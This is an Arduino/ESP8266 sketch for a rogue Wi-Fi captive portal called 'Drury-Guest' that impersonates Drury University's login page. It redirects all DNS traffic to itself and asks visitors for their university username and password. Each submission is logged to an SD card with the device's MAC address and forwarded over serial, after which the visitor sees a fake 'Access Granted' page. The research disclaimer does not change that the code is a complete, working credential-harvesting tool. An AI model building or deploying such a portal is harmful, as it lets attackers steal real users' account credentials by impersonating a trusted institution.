#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <DNSServer.h>
#include <SPI.h>
#include <SD.h>

#define SD_CS_PIN D8

const char* honeypot_ssid = "Drury-Guest";
const char* honeypot_password = "";

ESP8266WebServer server(80);
DNSServer dnsServer;

void setup() {
  Serial.begin(9600); // Communication with Arduino Uno
  delay(3000);
  
  Serial.println();
  Serial.println("=== DRURY UNIVERSITY HONEYPOT ===");
  
  // Initialize SD card
  if (SD.begin(SD_CS_PIN)) {
    Serial.println("✅ SD card ready");
    // Create log file header
    File logFile = SD.open("/final_test_results.txt", FILE_WRITE);
    if (logFile) {
      logFile.println("=== FINAL TEST RESULTS ===");
      logFile.println("Timestamp(ms) | MAC Address | Username | Password");
      logFile.println("================================================");
      logFile.close();
    }
  } else {
    Serial.println("❌ SD card failed");
  }
  
  // Start honeypot AP
  WiFi.softAP(honeypot_ssid, honeypot_password);
  Serial.print("✅ Honeypot: ");
  Serial.println(honeypot_ssid);
  Serial.print("IP: ");
  Serial.println(WiFi.softAPIP());
  
  // Setup DNS captive portal
  dnsServer.start(53, "*", WiFi.softAPIP());
  
  // Web server routes
  server.on("/", []() {
    server.send(200, "text/html", 
      "<!DOCTYPE html>"
      "<html lang='en'>"
      "<head>"
      "<meta charset='UTF-8'>"
      "<meta name='viewport' content='width=device-width, initial-scale=1.0'>"
      "<title>Drury University - Guest WiFi Access</title>"
      "<style>"
      "* { margin: 0; padding: 0; box-sizing: border-box; }"
      "body { "
      "  font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; "
      "  background: linear-gradient(135deg, #0c2c4d 0%, #1a4d7a 100%); "
      "  color: #333; "
      "  min-height: 100vh; "
      "  display: flex; "
      "  align-items: center; "
      "  justify-content: center; "
      "  padding: 20px; "
      "}"
      ".login-container { "
      "  background: white; "
      "  border-radius: 15px; "
      "  box-shadow: 0 15px 35px rgba(0, 0, 0, 0.3); "
      "  overflow: hidden; "
      "  max-width: 450px; "
      "  width: 100%; "
      "}"
      ".header { "
      "  background: #0c2c4d; "
      "  color: white; "
      "  padding: 30px 20px; "
      "  text-align: center; "
      "}"
      ".header h1 { "
      "  font-size: 24px; "
      "  font-weight: 600; "
      "  margin-bottom: 5px; "
      "}"
      ".header p { "
      "  opacity: 0.9; "
      "  font-size: 14px; "
      "}"
      ".content { "
      "  padding: 30px; "
      "}"
      ".wifi-icon { "
      "  text-align: center; "
      "  margin-bottom: 20px; "
      "}"
      ".wifi-icon svg { "
      "  width: 60px; "
      "  height: 60px; "
      "  fill: #0c2c4d; "
      "}"
      ".form-group { "
      "  margin-bottom: 20px; "
      "}"
      "label { "
      "  display: block; "
      "  margin-bottom: 8px; "
      "  font-weight: 600; "
      "  color: #0c2c4d; "
      "  font-size: 14px; "
      "}"
      "input[type='text'], "
      "input[type='password'] { "
      "  width: 100%; "
      "  padding: 15px; "
      "  border: 2px solid #e1e5eb; "
      "  border-radius: 8px; "
      "  font-size: 16px; "
      "  transition: border-color 0.3s ease; "
      "  background: #f8f9fa; "
      "}"
      "input[type='text']:focus, "
      "input[type='password']:focus { "
      "  outline: none; "
      "  border-color: #0c2c4d; "
      "  background: white; "
      "}"
      ".btn { "
      "  width: 100%; "
      "  padding: 15px; "
      "  background: linear-gradient(135deg, #0c2c4d 0%, #1a4d7a 100%); "
      "  color: white; "
      "  border: none; "
      "  border-radius: 8px; "
      "  font-size: 16px; "
      "  font-weight: 600; "
      "  cursor: pointer; "
      "  transition: transform 0.2s ease, box-shadow 0.2s ease; "
      "}"
      ".btn:hover { "
      "  transform: translateY(-2px); "
      "  box-shadow: 0 5px 15px rgba(12, 44, 77, 0.4); "
      "}"
      ".help-links { "
      "  text-align: center; "
      "  margin-top: 20px; "
      "  padding-top: 20px; "
      "  border-top: 1px solid #e1e5eb; "
      "}"
      ".help-links a { "
      "  color: #0c2c4d; "
      "  text-decoration: none; "
      "  font-size: 14px; "
      "  margin: 0 10px; "
      "}"
      ".help-links a:hover { "
      "  text-decoration: underline; "
      "}"
      ".disclaimer { "
      "  background: #fff3cd; "
      "  border: 1px solid #ffeaa7; "
      "  border-radius: 8px; "
      "  padding: 15px; "
      "  margin-top: 20px; "
      "  font-size: 12px; "
      "  color: #856404; "
      "  text-align: center; "
      "}"
      ".network-info { "
      "  background: #e7f3ff; "
      "  border: 1px solid #b3d9ff; "
      "  border-radius: 8px; "
      "  padding: 12px; "
      "  margin-bottom: 20px; "
      "  text-align: center; "
      "  font-size: 13px; "
      "  color: #0066cc; "
      "}"
      ".footer { "
      "  background: #f8f9fa; "
      "  padding: 15px; "
      "  text-align: center; "
      "  font-size: 12px; "
      "  color: #6c757d; "
      "  border-top: 1px solid #e1e5eb; "
      "}"
      "@media (max-width: 480px) { "
      "  .content { "
      "    padding: 20px; "
      "  }"
      "  .header { "
      "    padding: 20px 15px; "
      "  }"
      "}"
      "</style>"
      "</head>"
      "<body>"
      "<div class='login-container'>"
      "  <div class='header'>"
      "    <h1>Drury University</h1>"
      "    <p>Guest Wireless Network Access</p>"
      "  </div>"
      "  "
      "  <div class='content'>"
      "    <div class='wifi-icon'>"
      "      <svg viewBox='0 0 24 24'>"
      "        <path d='M12 3C7.79 3 3.7 4.41.38 7C4.41 12.06 7.89 16.37 12 21.5C16.08 16.42 20.24 11.24 23.65 7C20.32 4.41 16.22 3 12 3Z'/>"
      "      </svg>"
      "    </div>"
      "    "
      "    <div class='network-info'>"
      "      <strong>Network:</strong> Drury-Guest • <strong>Security:</strong> WPA2 Enterprise"
      "    </div>"
      "    "
      "    <form action='/login' method='POST'>"
      "      <div class='form-group'>"
      "        <label for='username'>Drury Username</label>"
      "        <input type='text' id='username' name='username' placeholder='Enter your Drury username' required>"
      "      </div>"
      "      "
      "      <div class='form-group'>"
      "        <label for='password'>Password</label>"
      "        <input type='password' id='password' name='password' placeholder='Enter your password' required>"
      "      </div>"
      "      "
      "      <button type='submit' class='btn'>Connect to Network</button>"
      "    </form>"
      "    "
      "    <div class='help-links'>"
      "      <a href='#'>Forgot Password?</a>"
      "      <a href='#'>IT Help Desk</a>"
      "      <a href='#'>Create Guest Account</a>"
      "    </div>"
      "    "
      "    <div class='disclaimer'>"
      "      <strong>Educational Use Notice:</strong> This is a university cybersecurity research project. "
      "      All network activity is monitored for educational purposes. By connecting, you consent to participate in this research."
      "    </div>"
      "  </div>"
      "  "
      "  <div class='footer'>"
      "    Drury University IT Services • Secure Access Gateway v2.4"
      "  </div>"
      "</div>"
      "</body>"
      "</html>");
  });
  
  server.on("/login", HTTP_POST, []() {
    String username = server.arg("username");
    String password = server.arg("password");
    String clientIP = server.client().remoteIP().toString();
    
    // Get MAC address of connected client
    String macAddress = "UNKNOWN";
    struct station_info *station = wifi_softap_get_station_info();
    while (station != NULL) {
      IPAddress stationIP = IPAddress(station->ip.addr);
      if (stationIP.toString() == clientIP) {
        char macStr[18];
        snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
                 station->bssid[0], station->bssid[1], station->bssid[2],
                 station->bssid[3], station->bssid[4], station->bssid[5]);
        macAddress = String(macStr);
        break;
      }
      station = STAILQ_NEXT(station, next);
    }
    wifi_softap_free_station_info();
    
    // Log to SD card
    if (SD.begin(SD_CS_PIN)) {
      File logFile = SD.open("/final_test_results.txt", FILE_WRITE);
      if (logFile) {
        String logEntry = String(millis()) + " | " + macAddress + " | " + username + " | " + password;
        logFile.println(logEntry);
        logFile.close();
        Serial.println("📝 SD Log: " + logEntry);
      }
    }
    
    // Send to Arduino Uno in format: MAC|USER|PASS
    String arduinoData = macAddress + "|" + username + "|" + password;
    Serial.println(arduinoData);
    
    // Success page with same professional theme
    server.send(200, "text/html", 
      "<!DOCTYPE html>"
      "<html lang='en'>"
      "<head>"
      "<meta charset='UTF-8'>"
      "<meta name='viewport' content='width=device-width, initial-scale=1.0'>"
      "<title>Access Granted - Drury University</title>"
      "<style>"
      "* { margin: 0; padding: 0; box-sizing: border-box; }"
      "body { "
      "  font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; "
      "  background: linear-gradient(135deg, #0c2c4d 0%, #1a4d7a 100%); "
      "  color: #333; "
      "  min-height: 100vh; "
      "  display: flex; "
      "  align-items: center; "
      "  justify-content: center; "
      "  padding: 20px; "
      "}"
      ".success-container { "
      "  background: white; "
      "  border-radius: 15px; "
      "  box-shadow: 0 15px 35px rgba(0, 0, 0, 0.3); "
      "  overflow: hidden; "  
      "  max-width: 450px; "
      "  width: 100%; "
      "  text-align: center; "
      "}"
      ".header { "
      "  background: #0c2c4d; "
      "  color: white; "
      "  padding: 30px 20px; "
      "}"
      ".header h1 { "
      "  font-size: 24px; "
      "  font-weight: 600; "
      "}"
      ".content { "
      "  padding: 40px 30px; "
      "}"
      ".success-icon { "
      "  color: #28a745; "
      "  font-size: 48px; "
      "  margin-bottom: 20px; "
      "}"
      ".message { "
      "  margin-bottom: 25px; "
      "}"
      ".message h2 { "
      "  color: #28a745; "
      "  margin-bottom: 10px; "
      "  font-size: 22px; "
      "}"
      ".message p { "
      "  color: #666; "
      "  line-height: 1.6; "
      "}"
      ".next-steps { "
      "  background: #f8f9fa; "
      "  border-radius: 8px; "
      "  padding: 20px; "
      "  margin: 25px 0; "
      "  text-align: left; "
      "}"
      ".next-steps h3 { "
      "  color: #0c2c4d; "
      "  margin-bottom: 10px; "
      "  font-size: 16px; "
      "}"
      ".next-steps ul { "
      "  color: #666; "
      "  padding-left: 20px; "
      "}"
      ".next-steps li { "
      "  margin-bottom: 8px; "
      "  font-size: 14px; "
      "}"
      ".disclaimer { "
      "  background: #e7f3ff; "
      "  border: 1px solid #b3d9ff; "
      "  border-radius: 8px; "
      "  padding: 15px; "
      "  margin-top: 20px; "
      "  font-size: 12px; "
      "  color: #0066cc; "
      "}"
      ".footer { "
      "  background: #f8f9fa; "
      "  padding: 15px; "
      "  text-align: center; "
      "  font-size: 12px; "
      "  color: #6c757d; "
      "  border-top: 1px solid #e1e5eb; "
      "}"
      "</style>"
      "</head>"
      "<body>"
      "<div class='success-container'>"
      "  <div class='header'>"
      "    <h1>Drury University</h1>"
      "  </div>"
      "  "
      "  <div class='content'>"
      "    <div class='success-icon'>✓</div>"
      "    "
      "    <div class='message'>"
      "      <h2>Access Granted</h2>"
      "      <p>You have successfully connected to the Drury University Guest Network.</p>"
      "    </div>"
      "    "
      "    <div class='next-steps'>"
      "      <h3>What's Next?</h3>"
      "      <ul>"
      "        <li>You now have access to the internet</li>"
      "        <li>For security, please close this browser window</li>"
      "        <li>Contact IT Help Desk if you experience issues</li>"
      "      </ul>"
      "    </div>"
      "    "
      "    <div class='disclaimer'>"
      "      <strong>Research Participation:</strong> Thank you for participating in our cybersecurity education initiative. "
      "      This demonstration helps improve campus network security."
      "    </div>"
      "  </div>"
      "  "
      "  <div class='footer'>"
      "    Drury University IT Services • Connection Established"
      "  </div>"
      "</div>"
      "</body>"
      "</html>");
  });
  
  // Captive portal detection
  server.on("/hotspot-detect.html", []() {
    server.send(200, "text/html", 
      "<!DOCTYPE html>"
      "<html>"
      "<head>"
      "<title>Redirecting...</title>"
      "<meta http-equiv='refresh' content='0;url=http://" + WiFi.softAPIP().toString() + "/'>"
      "</head>"
      "<body>"
      "<p>Redirecting to Drury University network access portal...</p>"
      "</body>"
      "</html>");
  });
  
  server.on("/generate_204", []() {
    server.send(204, "text/plain", "");
  });
  
  server.onNotFound([]() {
    server.sendHeader("Location", "http://" + WiFi.softAPIP().toString(), true);
    server.send(302, "text/plain", "");
  });
  
  server.begin();
  Serial.println("✅ Drury University Honeypot ready - waiting for connections...");
}

void loop() {
  dnsServer.processNextRequest();
  server.handleClient();
  delay(10);
}